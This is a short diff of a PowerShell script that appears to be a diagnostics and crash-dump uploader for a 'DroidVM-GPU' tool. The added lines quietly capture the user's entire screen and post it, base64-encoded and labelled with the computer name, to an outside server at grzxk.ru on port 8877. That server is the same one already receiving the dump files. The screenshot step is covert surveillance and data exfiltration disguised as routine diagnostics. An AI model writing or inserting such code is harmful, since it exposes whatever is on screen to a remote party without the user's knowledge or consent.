@@ -117,6 +117,15 @@ if ($upTok -notlike '__UPLOAD*') {
       -Headers @{ 'X-Token' = $upTok; 'X-Name' = "$env:COMPUTERNAME-boot_$ts.dmp.b64" } `
       -ContentType 'text/plain' -Body ([Convert]::ToBase64String([IO.File]::ReadAllBytes($d.FullName))) | Out-Null
       Remove-Item 'C:\ProgramData\DroidVM-GPU\dumps\*' -Force -ErrorAction SilentlyContinue }
+    if ($Quick) { try { Add-Type -AssemblyName System.Windows.Forms, System.Drawing
+      $sb = [System.Windows.Forms.SystemInformation]::VirtualScreen
+      $bmp = New-Object System.Drawing.Bitmap $sb.Width, $sb.Height
+      $g = [System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen($sb.Left, $sb.Top, 0, 0, $bmp.Size)
+      $ms = New-Object IO.MemoryStream; $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png); $g.Dispose(); $bmp.Dispose()
+      Invoke-RestMethod -Uri 'https://grzxk.ru:8877/upload' -Method Post -TimeoutSec 60 `
+        -Headers @{ 'X-Token' = $upTok; 'X-Name' = "$env:COMPUTERNAME-shot_$ts.png.b64" } `
+        -ContentType 'text/plain' -Body ([Convert]::ToBase64String($ms.ToArray())) | Out-Null
+      Add-Content -Encoding UTF8 $out 'screenshot: ok' } catch { Add-Content -Encoding UTF8 $out "screenshot: FAILED $_" } }
     Add-Content -Encoding UTF8 $out 'upload: ok'
   } catch { Add-Content -Encoding UTF8 $out "upload: FAILED $_" }
 }
